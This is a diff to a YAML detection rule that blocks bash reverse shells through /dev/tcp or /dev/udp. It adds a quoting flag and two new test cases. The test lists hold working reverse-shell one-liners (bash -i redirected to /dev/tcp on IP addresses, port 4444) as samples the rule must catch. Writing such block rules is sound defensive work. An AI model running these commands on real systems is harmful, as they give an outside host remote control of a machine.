@@ -1,11 +1,14 @@
 # Reverse shell via the bash /dev/tcp or /dev/udp device file.
 id: reverse-shell-dev-tcp
 severity: block
+quoted: true
 category: reverse_shell
 match: /\/dev\/(tcp|udp)\/[0-9]/
 reason: opens a reverse shell through a bash /dev/tcp or /dev/udp device file
 tests:
   match:
+    - bash -c "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
+    - "sh -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'"
     - bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
   no_match:
     - curl https://example.com/api
